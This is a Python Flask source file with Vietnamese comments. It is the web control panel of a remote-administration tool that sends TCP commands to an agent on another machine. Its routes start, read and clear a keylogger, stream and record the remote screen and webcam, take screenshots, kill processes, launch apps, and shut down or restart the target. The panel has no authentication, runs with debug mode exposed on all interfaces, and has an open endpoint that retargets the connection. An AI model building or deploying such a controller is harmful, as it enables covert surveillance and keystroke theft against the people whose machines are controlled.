from flask import Flask, render_template, request, jsonify, Response
import socket
import json
import os
import struct
from datetime import datetime
import signal
import time

# --- CẤU HÌNH MẶC ĐỊNH ---
TCP_SERVER_IP = "127.0.0.1" 
TCP_PORT = 5001

app = Flask(__name__)

# --- API CẤU HÌNH KẾT NỐI (MỚI) ---
@app.route("/api/configure", methods=["POST"])
def configure_connection():
    global TCP_SERVER_IP, TCP_PORT
    data = request.get_json()
    
    new_ip = data.get("ip")
    new_port = data.get("port")
    
    if new_ip:
        TCP_SERVER_IP = new_ip
    
    if new_port:
        try:
            TCP_PORT = int(new_port)
        except ValueError:
            return jsonify({"status": "error", "message": "Port phải là số!"})
            
    return jsonify({
        "status": "ok", 
        "message": f"Đã cập nhật: {TCP_SERVER_IP}:{TCP_PORT}"
    })

# --- API LẤY CẤU HÌNH HIỆN TẠI (MỚI) ---
@app.route("/api/config_info")
def get_config_info():
    return jsonify({"ip": TCP_SERVER_IP, "port": TCP_PORT})

# --- CÁC HÀM CŨ (GIỮ NGUYÊN) ---
def send_tcp_command(cmd):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3) # Timeout để tránh treo nếu sai IP
            s.connect((TCP_SERVER_IP, TCP_PORT))
            s.sendall(cmd.encode())
            # Nhận dữ liệu (Vòng lặp nhận đến khi hết)
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk: break
                    data += chunk
                except socket.timeout: break
            return data.decode()
    except Exception as e:
        return f"[ERROR] {e}"

def get_image_from_server(command):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((TCP_SERVER_IP, TCP_PORT))
            s.sendall(command.encode())
            
            size_data = s.recv(4)
            if not size_data: return None
            size = struct.unpack(">L", size_data)[0]
            if size == 0: return None
            
            data = b""
            while len(data) < size:
                packet = s.recv(size - len(data))
                if not packet: break
                data += packet
            return data
    except:
        return None

def save_screenshot_locally():
    try:
        img_data = get_image_from_server("download_screenshot")
        if not img_data: return "[ERROR] Failed to download"
        os.makedirs("client_screenshots", exist_ok=True)
        filename = f"client_screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, "wb") as f: f.write(img_data)
        return f"Saved: {os.path.abspath(filename)}"
    except Exception as e: return f"[ERROR] {e}"

def save_video_locally(seconds):
    try:
        video_data = get_image_from_server(f"webcam_record {seconds}")
        if not video_data: return "[ERROR] Failed to download"
        os.makedirs("client_recordings", exist_ok=True)
        filename = f"client_recordings/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        with open(filename, "wb") as f: f.write(video_data)
        return f"Saved: {os.path.abspath(filename)}"
    except Exception as e: return f"[ERROR] {e}"

def generate_stream(command):
    while True:
        frame_data = get_image_from_server(command)
        if frame_data:
            yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')

def get_remote_apps():
    try:
        res = send_tcp_command("list_apps")
        return json.loads(res) if res and not res.startswith("[ERROR]") else {}
    except: return {}

#ROUTES
@app.route("/")
def home(): return render_template("index.html", title="Home", mode="home")

@app.route("/start")
def start_page(): return render_template("index.html", title="Start App", mode="apps", app_list=get_remote_apps())

@app.route("/stop")
def stop_page(): return render_template("index.html", title="Stop App", mode="apps", app_list=get_remote_apps())

@app.route("/apps")
def manage_apps_page(): return render_template("index.html", title="App Manager", mode="apps", app_list=get_remote_apps())

@app.route("/screenshot")
def screenshot_page(): return render_template("index.html", title="Live Screen", mode="screenshot")

@app.route("/webcam")
def webcam_page(): return render_template("index.html", title="Live Webcam", mode="webcam")

@app.route("/shutdown")
def shutdown_page(): return render_template("index.html", title="Shutdown", mode="shutdown")

@app.route("/restart")
def restart_page(): return render_template("index.html", title="Restart", mode="restart")

@app.route("/processes")
def processes_page():
    return render_template("index.html", title="Task Manager", mode="processes", process_list=send_tcp_command("list_processes"))

@app.route("/keylogger")
def keylogger_page():
    send_tcp_command("keylog_clear")
    try: os.remove("web_keylog.txt") 
    except: pass
    return render_template("index.html", title="Keylogger", mode="keylogger", keys="")

@app.route('/video_feed_screen')
def video_feed_screen(): return Response(generate_stream("screen_stream"), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/video_feed_webcam')
def video_feed_webcam(): return Response(generate_stream("webcam_stream"), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/api/apps_status")
def api_apps_status(): return jsonify(get_remote_apps())

@app.route("/keylogger_data")
def keylogger_data():
    return jsonify({"keys": send_tcp_command("keylog_data")})

@app.route("/logkey_web", methods=["POST"])
def logkey_web():
    # Route này giờ chỉ để giữ tính tương thích, không làm gì cả vì đã tắt gửi phím từ web
    return jsonify({"status": "ignored"})

@app.route("/control", methods=["POST"])
def control_action():
    if request.is_json:
        data = request.get_json()
        action, app_name, seconds, pid = data.get("action"), data.get("app"), data.get("seconds"), data.get("pid")
    else:
        # Fallback cho form data cũ (ít dùng)
        return jsonify({"status": "error", "message": "Please use JSON"})

    command = ""
    result = ""

    if action == "keylog_start": command = "keylog_start"
    elif action == "keylog_stop": command = "keylog_stop"
    elif action == "keylog_clear": command = "keylog_clear"
    elif action == "disconnect": command = "disconnect"
    elif action == "terminate_server":
        command = "terminate_server"
    
    elif action == "terminate_client":
        # Hàm tự sát (Tắt Client Flask)
        def kill_self():
            time.sleep(1)
            os.kill(os.getpid(), signal.SIGINT) # Gửi tín hiệu ngắt (như bấm Ctrl+C)
        
        # Chạy luồng tắt sau 1s để kịp trả về JSON "OK" cho trình duyệt
        import threading
        threading.Thread(target=kill_self).start()
        
        return jsonify({"status": "ok", "message": "Client web server is shutting down..."})
    elif action == "kill_process": command = f"kill_process {pid}" if pid else ""
    elif action == "screenshot": result = save_screenshot_locally()
    elif action == "webcam_record":
        if not seconds or not str(seconds).isdigit(): result = "[ERROR] Invalid seconds"
        else: result = save_video_locally(seconds)
    elif action in ("start", "stop"):
        command = f"{action} {app_name}"
    elif action == "shutdown": command = "shutdown"
    elif action == "restart": command = "restart"
    else: return jsonify({"status": "error", "message": "Unknown action"})

    if command: result = send_tcp_command(command)
    
    return jsonify({"status": "ok", "message": result})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)